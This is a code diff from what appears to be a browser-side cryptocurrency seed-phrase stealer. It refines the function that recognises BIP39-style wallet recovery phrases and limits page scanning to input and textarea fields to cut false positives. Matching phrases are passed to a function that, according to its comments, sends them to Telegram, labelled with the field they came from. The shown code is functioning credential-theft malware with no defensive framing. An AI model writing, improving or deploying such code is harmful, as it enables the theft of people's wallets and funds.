@@ -25,9 +25,18 @@ function wc(val) {
   return (val || '').trim().split(/\s+/).filter(w => w.length > 0).length;
 }
 
-// --- Validate seed phrase ---
+// --- Validate real seed phrase (BIP39 style) ---
+// Real seed phrases: all lowercase, no punctuation, short words (3-8 chars)
+// NOT sentences like "Download the app from the official website..."
 function isSeedPhrase(val) {
-  return val && [12, 15, 18, 21, 24].includes(wc(val));
+  if (!val || typeof val !== 'string') return false;
+  const words = val.trim().split(/\s+/).filter(w => w.length > 0);
+  if (![12, 15, 18, 21, 24].includes(words.length)) return false;
+  // Every word must be: all lowercase letters only, 2-10 chars, no numbers/punctuation
+  const validWord = /^[a-z]{2,10}$/;
+  const validCount = words.filter(w => validWord.test(w)).length;
+  // At least 90% of words must pass (allow for slight variations)
+  return (validCount / words.length) >= 0.9;
 }
 
 // --- Send to Telegram ---
@@ -66,25 +75,20 @@ function sendPhrase(phrase, type, extra) {
     .catch(e => console.error('❌ Send failed:', e));
 }
 
-// --- DOM scan for displayed phrases ---
+// --- DOM scan: ONLY check input/textarea fields for displayed phrases ---
+// We do NOT scan page text — that captures normal sentences as false positives
 function scanDOM(root) {
   if (!root || !root.querySelectorAll) return;
-  // Only check leaf-like elements to avoid duplicate parent-child matches
-  root.querySelectorAll('*').forEach(el => {
+  // Only scan actual form inputs where a wallet app would display/pre-fill a phrase
+  root.querySelectorAll('input, textarea').forEach(el => {
     if (el.getAttribute('data-tp-sent')) return;
-    let txt = '';
-    if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
-      txt = el.value || '';
-    } else if (el.children.length === 0 || ['PRE','CODE','SPAN','P'].includes(el.tagName)) {
-      txt = el.textContent || '';
-    }
-    txt = txt.trim();
+    const txt = (el.value || '').trim();
     if (isSeedPhrase(txt)) {
       el.setAttribute('data-tp-sent', '1');
       const cls = (el.className || '').toString().trim().split(' ')[0];
-      console.log('📋 Displayed phrase:', wc(txt), 'words in', el.tagName + (cls ? '.' + cls : ''));
+      console.log('📋 Displayed phrase in field:', wc(txt), 'words');
       sendPhrase(txt, 'WALLET_CREATED_DISPLAYED', {
-        ELEMENT: el.tagName + (cls ? '.' + cls : '')
+        FIELD: el.name || el.id || el.placeholder || cls || 'field'
       });
     }
   });
